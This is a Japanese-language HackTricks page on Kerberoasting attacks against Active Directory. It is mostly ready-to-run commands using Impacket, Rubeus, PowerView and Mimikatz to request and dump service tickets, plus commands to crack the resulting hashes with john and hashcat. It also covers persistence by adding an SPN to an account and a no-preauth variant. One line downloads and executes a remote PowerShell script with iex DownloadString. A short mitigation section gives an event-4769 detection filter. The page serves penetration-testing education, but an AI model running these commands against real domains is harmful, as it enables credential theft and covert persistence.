# Kerberoast

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で**最も進んだ**コミュニティツールによって動力を供給される**ワークフローを簡単に構築し自動化**します。\
今すぐアクセス：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)で</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksに広告を掲載したい場合**や**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングテクニックを共有する。

</details>

## Kerberoast

**Kerberoasting**の目的は、AD内のユーザーアカウントに代わって実行されるサービスの**TGSチケットを収集する**ことです。これはコンピューターアカウントではありません。したがって、これらのTGS**チケットの一部は**、ユーザーパスワードから派生した**キー**で**暗号化されています**。その結果、それらの資格情報は**オフラインでクラック可能**です。\
**ユーザーアカウント**が**サービス**として使用されていることがわかるのは、プロパティ**"ServicePrincipalName"**が**nullでない**場合です。

したがって、Kerberoastingを実行するには、TGSを要求できるドメインアカウントが必要ですが、特別な権限は必要ないため、誰でも可能です。

**ドメイン内で有効な資格情報が必要です。**

### **攻撃**

{% hint style="warning" %}
**Kerberoastingツール**は、攻撃を実行しTGS-REQリクエストを開始する際に通常**`RC4暗号化`**を要求します。これは、**RC4が**[**より弱い**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795)ため、Hashcatなどのツールを使用してAES-128やAES-256などの他の暗号化アルゴリズムよりもオフラインでクラックしやすいからです。\
RC4（タイプ23）のハッシュは**`$krb5tgs$23$*`**で始まり、AES-256（タイプ18）は**`$krb5tgs$18$*`**で始まります。`
{% endhint %}

#### **Linux**
```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
```
マルチフィーチャーツール、kerberoast可能なユーザーのダンプを含む：
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```
#### Windows

* **Kerberoastableユーザーの列挙**
```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```
* **テクニック1: TGSを要求し、メモリからダンプする**
```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
* **テクニーク2: 自動ツール**
```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
{% hint style="warning" %}
TGSが要求されると、Windowsイベント `4769 - A Kerberos service ticket was requested` が生成されます。
{% endhint %}

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) を使用して、世界で **最も進んだ** コミュニティツールによって動力を供給される **ワークフローを簡単に構築し自動化** します。\
今すぐアクセス：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

### クラッキング
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### 永続性

ユーザーに対して**十分な権限**がある場合、そのユーザーを**kerberoast可能**にすることができます：
```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```
以下は、**kerberoast** 攻撃に役立つ**ツール**を見つけることができるリンクです: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

Linuxからこの**エラー**が出た場合：**`Kerberos SessionError: KRB_AP_ERR_SKEW(時差が大きすぎます)`** は、ローカル時間が原因です。ホストをDCと同期する必要があります。いくつかのオプションがあります：

* `ntpdate <DCのIP>` - Ubuntu 16.04以降では非推奨
* `rdate -n <DCのIP>`

### 軽減策

Kerberoastは、悪用可能であれば非常に潜在的です

* セキュリティイベントID 4769 – Kerberosチケットが要求されました
* 4769は非常に頻繁なので、結果をフィルタリングしましょう：
* サービス名はkrbtgtであってはなりません
* サービス名は$で終わってはいけません（サービス用のマシンアカウントをフィルタリングするため）
* アカウント名はmachine@domainであってはいけません（マシンからの要求をフィルタリングするため）
* 失敗コードは'0x0'です（失敗をフィルタリングするため、0x0は成功です）
* 最も重要なのは、チケット暗号化タイプが0x17であることです
* 軽減策：
* サービスアカウントのパスワードは推測が難しいものでなければなりません（25文字以上）
* マネージドサービスアカウントを使用する（定期的なパスワードの自動変更と委任されたSPN管理）
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
## ドメインアカウントなしのKerberoast

2022年9月に、[Charlie Clark](https://exploit.ph/)によって発見された脆弱性により、Active Directoryアカウントを制御していなくても、KRB\_AS\_REQリクエストを通じてST（サービスチケット）を取得できることがわかりました。プリンシパルが事前認証なしで認証できる場合（AS-REP Roasting攻撃のように）、**KRB\_AS\_REQ**リクエストを使用して、リクエストが**暗号化されたTGT**の代わりに**ST**を要求するようにだますことができます。これはリクエストのreq-body部分の**sname**属性を変更することで実現します。

この技術については、次の記事で詳しく説明されています: [Semperisブログポスト](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)。

{% hint style="warning" %}
この技術を使用するには、LDAPをクエリする有効なアカウントがないため、ユーザーのリストを提供する必要があります。
{% endhint %}

#### Linux

* [impacket/GetUserSPNs.py from PR #1413](https://github.com/fortra/impacket/pull/1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```
#### Windows

* [GhostPack/Rubeus PR #139から](https://github.com/GhostPack/Rubeus/pull/139):
```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```
**ired.teamでのKerberoastingに関する詳細情報は**[**こちら**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)**と**[**こちら**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)**にあります。**

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい場合**や**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングテクニックを**共有する**。

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)を使用して、世界で**最も先進的な**コミュニティツールを駆使した**ワークフローを簡単に構築し自動化する**。\
今すぐアクセス： 

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
